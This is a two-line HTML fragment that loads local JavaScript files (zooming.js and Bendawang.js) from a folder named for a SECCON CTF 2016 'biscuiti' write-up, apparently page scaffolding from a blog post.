<script src="./Seccon-CTF-2016-biscuiti-writeup/zooming.js"></script>
<script src="./Seccon-CTF-2016-biscuiti-writeup/Bendawang.js"></script>


